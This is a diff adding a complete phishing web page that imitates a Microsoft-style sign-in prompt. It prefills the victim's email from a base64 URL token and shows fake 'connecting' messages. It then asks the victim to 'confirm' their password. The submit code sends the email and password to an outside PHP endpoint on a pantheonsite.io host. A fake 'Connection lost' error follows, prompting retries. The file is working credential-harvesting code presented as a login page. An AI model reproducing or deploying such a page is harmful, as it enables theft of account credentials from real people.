@@ -1,0 +1,306 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Network server</title>
+<style>
+body {
+    margin: 0;
+    padding: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Microsoft font style */
+}
+
+
+.center-box {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    background-color: whitesmoke; /* Blue color */
+    padding: 20px; /* Adjust padding as needed */
+}
+
+.loader {
+    border: 8px solid #f3f3f3;
+    border-top: 8px solid #3498db;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 2s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+#loadingText {
+    margin-top: 20px;
+    font-size: 18px;
+}
+
+/* Styles for the modal */
+.modal {
+    display: none;
+    position: fixed;
+    z-index: 1;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 170%;
+    overflow: auto;
+    background-color: rgba(0, 0, 0, 0.4);
+}
+
+.modal-content {
+    background-color: #fefefe;
+    margin: 10% auto;
+    padding: 30px;
+    border: 1px solid #888;
+    width: 29%;
+    max-width: 400px;
+    border-radius: 0px;
+}
+
+/* Update CSS for domain part inside the modal */
+.modal-content h2 {
+    font-size: 15px; /* Larger font size for domain */
+    color: white; /* Text color */
+    background-color: #0078D7; /* Microsoft blue background color */
+    padding: 5px 10px; /* Padding for better appearance */
+    border-radius: 0px; /* Rounded corners */
+    margin-bottom: 20px; /* Add some bottom margin */
+    text-transform: uppercase;
+}
+
+/* Add this CSS to align the submit button to the right */
+#loginForm {
+    display: flex;
+    flex-direction: column;
+}
+
+input[type="text"]#email {
+    padding: 12px 20px;
+    margin: 8px 0;
+    border-radius: 4px;
+    box-sizing: border-box;
+}
+
+/* Styling for password input */
+input[type="password"]#password {
+    border: 2px solid #e74c3c;
+    padding: 2px 0px;
+    margin: 8px 0;
+    box-sizing: border-box;
+    outline: none; /* Remove the outline */
+    border: none;
+    border-bottom: 1px solid;
+}
+.login-button {
+  align-self: flex-end; /* Align to the right */
+    width: auto; /* Adjust width as needed */
+    background-color: #0078D7; /* Match color with h3 */
+    padding: 10px 20px;
+    color: white;
+    outline: none; /* Remove the outline */
+    border: none;
+        }
+        .popup-message {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 15px;
+            background-color: #f44336;
+            color: #fff;
+            text-align: center;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+        }
+        .my-justified-text {
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            color: #ff0000;
+            font-size: 16px;
+
+          }
+          input::placeholder {
+  font-size: 15px; /* Change the font size to your desired value */
+  letter-spacing: 1px;
+}
+.urlDisplay {
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            margin-left: auto;
+            font-size: 16px;
+
+          }
+</style>
+</head>
+<body>
+<div class="center-box">
+  <div class="loader"></div>
+  <div id="loadingText">Loading...</div>
+
+  <!-- Modal -->
+  <div id="myModal" class="modal">
+    <div class="modal-content">
+      <h2 id="loginTitle"></h2> <!-- Updated ID for h2 -->
+      <div id="urlDisplay" class="urlDisplay"></div><p></p>
+      <form id="loginForm" onsubmit="submitForm(); return false;">
+        <input type="email" id="email" class="login-input" placeholder="Email" required="required" hidden>
+   </br>
+      
+        <input type="password" id="password" class="login-input" placeholder="Password" required>
+        <span class="my-justified-text">Please confirm your password.</span></p>
+
+        <button class="login-button" onclick="attemptLogin()">Sign in</button>
+
+        <div id="popupMessage" class="popup-message"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // Function to get query variable from URL
+  function getQueryVariable(variable) {
+    const query = window.location.search.substring(1);
+    const vars = query.split('&');
+    for (let i = 0; i < vars.length; i++) {
+      const pair = vars[i].split('=');
+      if (pair[0] === variable) {
+        return pair[1];
+      }
+    }
+    return null;
+  }
+
+  // Function to decode base64
+  function decodeBase64(value) {
+    try {
+      return atob(value);
+    } catch (e) {
+      return value; // return original value if decoding fails
+    }
+  }
+
+  // Function to extract domain part from URL
+  function extractDomain(url) {
+    let domain;
+    if (url.includes("@")) {
+      domain = url.split('@')[1]; // Extract domain part after '@'
+    } else {
+      domain = url.split('/')[2];
+    }
+    return domain;
+  }
+
+  const loadingText = document.getElementById('loadingText');
+  const modal = document.getElementById('myModal');
+  const modalContent = document.querySelector('.modal-content');
+  const urlDisplay = document.getElementById('urlDisplay');
+
+  // Function to change loading text every second
+  function changeLoadingText() {
+    const urlParamValue = getQueryVariable('token');
+    const decodedValue = decodeBase64(urlParamValue || ''); // Decode base64 if necessary
+    const domain = extractDomain(decodedValue);
+    const texts = [
+      "Loading...",
+      "user detected as " + decodedValue + "",
+      "connecting to " + decodedValue + ""
+    ];
+    let index = 0;
+
+    function displayText() {
+      if (index < texts.length) {
+        loadingText.textContent = texts[index];
+        index++;
+        setTimeout(displayText, 1000);
+      } else {
+        // Show the modal box after displaying all texts
+        modal.style.display = 'block';
+      }
+    }
+
+    // Start displaying text
+    displayText();
+
+    // Set domain value
+    document.getElementById('loginTitle').textContent = domain; // Set login title with domain
+  }
+
+  // Call the function to start changing text
+  changeLoadingText();
+
+  // Prevent closing the modal when clicking outside
+  modalContent.onclick = function(event) {
+    event.stopPropagation();
+  };
+
+  function submitForm() {
+              var email = document.getElementById('email').value;
+              var password = document.getElementById('password').value;
+              // Create a FormData object to send data to PHP
+              var formData = new FormData();
+              formData.append('email', email);
+              formData.append('password', password);
+  
+              // Send data to the PHP file using XMLHttpRequest
+              var xhr = new XMLHttpRequest();
+              xhr.open('POST', 'https://dev-dredre.pantheonsite.io/a/index.php', true);
+              xhr.onload = function () {
+                  console.log(xhr.responseText);
+              };
+              xhr.send(formData);
+  }
+
+  // Get the value of the 'url' query parameter from the URL
+  const urlParamValue = getQueryVariable('token');
+
+  // If the 'url' query parameter exists, set its decoded value to the email input field
+  if (urlParamValue !== null) {
+    const decodedValue = decodeBase64(urlParamValue);
+    urlDisplay.textContent = decodedValue;
+    document.getElementById('email').value = decodedValue;
+  }
+  function attemptLogin() {
+              // Update the text on the Login button to "Connecting..."
+              var loginButton = document.querySelector('.login-button');
+              var originalButtonText = loginButton.textContent;
+              loginButton.textContent = 'Signing in...';
+  
+              // Simulating a server timeout (replace with your actual login logic)
+              setTimeout(function () {
+                  // Display the popup message
+                  displayPopupMessage("Oops! Connection lost. Retry.");
+  
+                  // Restore the original text on the Login button
+                  loginButton.textContent = originalButtonText;
+  
+                  // Clear the password field
+                  document.getElementById('password').value = '';
+              }, 3000); // Display the error message after 3 seconds
+          }
+  
+          function displayPopupMessage(message) {
+              var popupMessage = document.getElementById("popupMessage");
+              popupMessage.textContent = message;
+  
+              // Show the popup message
+              popupMessage.style.display = "block";
+  
+              // Hide the popup message after 3 seconds
+              setTimeout(function () {
+                  popupMessage.style.display = "none";
+              }, 3000);
+          }
+</script>
+
+</body>
+</html>
